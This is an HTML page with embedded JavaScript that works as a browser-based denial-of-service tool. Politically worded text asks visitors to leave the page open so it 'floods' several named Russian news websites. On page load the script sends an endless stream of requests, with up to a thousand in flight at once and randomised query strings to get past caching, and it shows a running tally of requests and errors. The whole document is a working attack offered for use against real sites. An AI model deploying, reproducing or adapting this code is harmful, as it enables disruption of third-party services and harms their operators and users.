<head>
  <title>attack that is attempted to disrupt the traffic of a targeted service/application, server, or network.</title>
</head>
<body>
  <h1>russia MUST BE STOPPED!</h1>
  <h3>English version</h3>
  <p>Please, just open this page and let it be open on your devices, it will flood the web-sites and pose a huge load on their infrastructure</p>
  <h3>Here is the stats of your session (the links and the number of the requests that were sent from your browser):</h3>
  <div id="stats"></div>
  <div id="errors"></div>
</body>
<script>
var targets = {
  'https://lenta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
}

var statsEl = document.getElementById('stats');
function printStats() {
  statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
}
setInterval(printStats, 1000);

var CONCURRENCY_LIMIT = 1000
var queue = []

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

async function flood(target) {
  for (var i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
    queue.push(
      fetchWithTimeout(target+rand, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
          targets[target].error_message = error.message
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
            targets[target].error_message = response.statusText
          }
          targets[target].number_of_requests++;
        })

    )
  }
}

// Start
Object.keys(targets).map(flood)
</script>
